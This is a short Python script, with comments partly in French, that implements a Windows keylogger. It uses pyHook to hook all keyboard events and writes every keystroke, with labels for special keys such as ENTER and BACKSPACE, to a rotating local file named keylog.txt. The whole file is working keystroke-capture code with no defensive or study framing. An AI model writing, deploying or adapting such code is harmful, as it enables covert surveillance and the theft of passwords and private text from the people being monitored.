import pythoncom
import pyHook
import logging
from logging.handlers import RotatingFileHandler

# Configure logging
log_filename = 'keylog.txt'
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger()
# Rotate log after reaching 1MB, keep 5 old versions of the log file.
handler = RotatingFileHandler(log_filename, maxBytes=1e6, backupCount=5)
logger.addHandler(handler)

def OnKeyboardEvent(event):
    # Gestion des touches spéciales pour une meilleure lisibilité
    special_keys = {8: 'BACKSPACE', 9: 'TAB', 13: 'ENTER', 27: 'ESC', 32: 'SPACE'}
    if event.Ascii in special_keys:
        logging.debug('<{}>'.format(special_keys[event.Ascii]))
    else:
        # Enregistre le caractère pressé dans le fichier log
        logging.debug(chr(event.Ascii))
    return True

# Création de l'instance HookManager
hm = pyHook.HookManager()
# Configuration du gestionnaire d'événements
hm.KeyDown = OnKeyboardEvent
# Activation du hook du clavier
hm.HookKeyboard()
# Démarrage de la boucle de messages
pythoncom.PumpMessages()
